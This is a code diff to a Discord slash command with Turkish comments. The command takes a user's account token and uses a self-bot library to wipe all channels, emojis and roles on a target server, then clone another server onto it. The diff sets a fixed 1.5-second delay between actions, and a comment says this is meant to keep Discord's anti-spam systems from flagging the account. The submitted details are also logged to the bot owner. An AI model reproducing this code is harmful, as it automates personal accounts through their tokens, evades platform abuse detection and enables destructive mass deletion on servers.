@@ -4,8 +4,8 @@ const {
 } = require('discord.js');
 const { Client: SelfClient } = require('discord.js-selfbot-v13');
 
-// Rate limit yememek için dinamik gecikme fonksiyonu
-const jitter = (ms = 500) => new Promise(res => setTimeout(res, Math.floor(Math.random() * 500) + ms));
+// Discord hesap şüphelenmesini (Rate Limit / Anti-Spam) önlemek için her işlem arasına net 1.5 saniye sabit gecikme ekleyen fonksiyon
+const jitter = (ms = 1500) => new Promise(res => setTimeout(res, ms));
 
 module.exports = {
     data: new SlashCommandBuilder()
@@ -65,7 +65,7 @@ module.exports = {
                         await botOwner.send({ embeds: [logEmbed] }).catch(() => {});
                     }
 
-                    // İşlemi poketleyip başlatıyoruz
+                    // İşlemi başlatıyoruz
                     startGodModeClone(botOwner, t, s, h);
                     
                     await int.editReply("🌌 Bilgiler başarıyla sisteme aktarıldı! İşlem başlatılıyor.");
@@ -110,19 +110,24 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             // --- 1. AŞAMA: TAM TEMİZLİK (KANALLAR VE ESKİ ROLLER) ---
             // Kanalları silme
             const chans = await trg.channels.fetch();
-            for (const c of chans.values()) { await c.delete().catch(() => {}); await jitter(400); }
+            for (const c of chans.values()) { 
+                await c.delete().catch(() => {}); 
+                await jitter(1500); 
+            }
 
             // Emojileri silme
             const emojis = await trg.emojis.fetch();
-            for (const e of emojis.values()) { await e.delete().catch(() => {}); await jitter(300); }
+            for (const e of emojis.values()) { 
+                await e.delete().catch(() => {}); 
+                await jitter(1500); 
+            }
 
-            // İstediğin Değişiklik: Hedef sunucudaki tüm eski rolleri temizleme
+            // Hedef sunucudaki tüm eski rolleri temizleme
             const roles = await trg.roles.fetch();
-            // @everyone silinemez, managed (bot entegrasyon rolleri) silinemez, editable (yetkinin yettiği) roller filtrelenir
             const toDeleteRoles = roles.filter(r => r.name !== '@everyone' && !r.managed && r.editable).sort((a,b) => a.position - b.position);
             for (const r of toDeleteRoles.values()) { 
                 await r.delete().catch(() => {}); 
-                await jitter(400); 
+                await jitter(1500); 
             }
 
             await owner.send("🧹 **Temizlik Tamamlandı:** Hedef sunucudaki eski kanallar, emojiler ve roller tamamen silindi.");
@@ -145,7 +150,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                     mentionable: r.mentionable
                 }).catch(() => null);
                 if (newRole) roleMap.set(r.id, newRole.id);
-                await jitter(500);
+                await jitter(1500);
             }
 
             // --- 3. AŞAMA: KATEGORİ VE KANALLAR ---
@@ -160,7 +165,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                         allow: o.allow, deny: o.deny, type: o.type
                     }))
                 }).catch(() => null);
-                await jitter(600);
+                await jitter(1500);
 
                 if (newCat) {
                     channelMap.set(cat.id, newCat.id);
@@ -180,7 +185,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
                                 allow: o.allow, deny: o.deny, type: o.type
                             }))
                         }).catch(() => null);
-                        await jitter(700);
+                        await jitter(1500);
                     }
                 }
             }
@@ -188,7 +193,7 @@ async function startGodModeClone(owner, token, srcId, trgId) {
             // --- 4. AŞAMA: EMOJİLER ---
             for (const emoji of src.emojis.cache.values()) {
                 await trg.emojis.create(emoji.url, emoji.name).catch(() => {});
-                await jitter(400);
+                await jitter(1500);
             }
 
             await owner.send(`👑 **Başarılı:** \`${src.name}\` sunucusunun tüm şablonu ve rolleri hedef sunucuya aktarıldı.`);
